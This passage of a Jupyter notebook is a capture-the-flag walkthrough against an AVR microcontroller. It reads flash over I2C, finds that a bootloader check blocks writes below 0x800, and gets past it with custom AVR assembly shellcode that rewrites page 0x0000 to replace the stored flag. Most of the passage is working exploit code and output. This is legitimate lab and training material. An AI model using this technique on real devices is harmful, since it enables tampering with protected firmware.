    "flag_page_data = bytearray(i2c_read_high(flag_page, SPM_PAGESIZE))\n",
    "flag_index = flag_address - flag_page\n",
    "replacement_flag = b\"$FLAG:Blake\".ljust(len(flag), b\"\\0\")\n",
    "flag_page_data[flag_index : flag_index + len(replacement_flag)] = replacement_flag"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If we try to write to the flag page 0x8000 we will quickly hit one of the asserts in `flash_memory`. This assert corresponds to the `flash_addr >= 0x800` check in the source code preventing us from directly writing to the page containing the flag."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Flashing 64 bytes to 0x0000..."
     ]
    },
    {
     "ename": "AssertionError",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mAssertionError\u001b[0m                            Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-23-530269a8512a>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mflash_memory\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mflag_page\u001b[0m \u001b[0;34m-\u001b[0m \u001b[0;36m0x8000\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mflag_page_data\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;32m<ipython-input-13-7d1f4876c0f0>\u001b[0m in \u001b[0;36mflash_memory\u001b[0;34m(address, data)\u001b[0m\n\u001b[1;32m     32\u001b[0m         \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'.'\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mend\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;34m''\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     33\u001b[0m         \u001b[0mchunk_address\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0maddress\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0moffset\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 34\u001b[0;31m         \u001b[0mflash_memory_small\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0maddress\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0moffset\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mchunk\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     35\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     36\u001b[0m     \u001b[0;31m# Verify the write, it fails sometimes\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m<ipython-input-13-7d1f4876c0f0>\u001b[0m in \u001b[0;36mflash_memory_small\u001b[0;34m(flash_addr, data)\u001b[0m\n\u001b[1;32m      9\u001b[0m     \u001b[0;32massert\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mflash_addr\u001b[0m \u001b[0;34m%\u001b[0m \u001b[0mSPM_PAGESIZE\u001b[0m \u001b[0;34m==\u001b[0m \u001b[0;36m0\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     10\u001b[0m     \u001b[0;31m# Test if we can write to the program memory address\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 11\u001b[0;31m     \u001b[0;32massert\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mflash_addr\u001b[0m \u001b[0;34m&\u001b[0m \u001b[0;36m0x1fff\u001b[0m \u001b[0;34m>=\u001b[0m \u001b[0;36m0x800\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     12\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     13\u001b[0m     \u001b[0;31m# Place the data we want to write into memory\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mAssertionError\u001b[0m: "
     ]
    }
   ],
   "source": [
    "flash_memory(flag_page - 0x8000, flag_page_data)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We will have to find a way to write to addresses below 0x800.\n",
    "\n",
    "The only option seems to be to flash a new bootloader of our own into program memory without the 0x800 restriction and use it to flash the flag into memory. \n",
    "\n",
    "Carefully read the \"Self-Programming the Flash\" section of the datasheet and implement a bootloader. The code will read input data from the same `FREE_MEMORY_ADDR` and flash it to page 0x0000, the first page of flash which contains the flag."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Flashing 64 bytes to 0x1000... Verifying... Success.\n"
     ]
    }
   ],
   "source": [
    "%%shellcode --flash=0x1000\n",
    "FREE_MEMORY_ADDR = 0xc5\n",
    "PAGE_ADDRESS_LO  = 0x00\n",
    "PAGE_ADDRESS_HI  = 0x00\n",
    "\n",
    "    ldi        R17, 0b11               ; erase page\n",
    "    ldi        ZL, PAGE_ADDRESS_LO     ; page address\n",
    "    ldi        ZH, PAGE_ADDRESS_HI\n",
    "    sts        SPMCSR, R17\n",
    "    spm        Z\n",
    "\n",
    "    ldi        R17, 0b1                ; fill temporary page\n",
    "    ldi        XL, FREE_MEMORY_ADDR    ; pointer to input data\n",
    "    ldi        XH, 0x00\n",
    "fill_loop:\n",
    "    ld         R0, X+                  ; data to write to temporary page\n",
    "    ld         R1, X+\n",
    "    sts        SPMCSR, R17\n",
    "    spm        Z\n",
    "    adiw       Z, 2\n",
    "    cpi        XL, (FREE_MEMORY_ADDR + 64) & 0xff\n",
    "    BRNE       fill_loop\n",
    "\n",
    "    ldi        R17, 0b101              ; perform page write\n",
    "    ldi        ZL, PAGE_ADDRESS_LO     ; page address\n",
    "    ldi        ZH, PAGE_ADDRESS_HI\n",
    "    sts        SPMCSR, R17\n",
    "    spm        Z"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Ignoring I2C read error.\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'$FLAG:Blake\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'"
      ]
     },
     "execution_count": null,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Place the data we want to write into memory\n",
    "i2c_write_big(FREE_MEMORY_ADDR, flag_page_data)\n",
    "# Trigger the shellcode to flash the flag page into memory\n",
    "execute_shellcode(0x800)\n",
    "# Verify\n",
    "i2c_read_high(flag_address, len(flag))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Success. That's all four milestones of the CTF."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
